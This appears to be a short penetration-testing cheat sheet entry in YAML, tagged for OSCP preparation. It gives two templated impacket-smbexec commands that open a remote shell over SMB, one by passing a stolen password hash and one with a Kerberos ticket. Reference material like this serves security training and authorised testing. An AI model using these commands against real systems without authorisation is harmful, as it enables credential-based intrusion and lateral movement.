---
variants:
  - label: hash
    command: |
      impacket-smbexec -hashes :$HASH $DOMAIN/$USER@$IP
  - label: ticket
    command: |
      impacket-smbexec -k -no-pass $DOMAIN/$USER@$IP
description: Get a shell via SMBExec, by auth method.
os: [Linux]
category: [oscp, cli]
have: [hash, ticket]
service: [SMB]
phase: [Exploitation]
references:
  - https://github.com/fortra/impacket
---
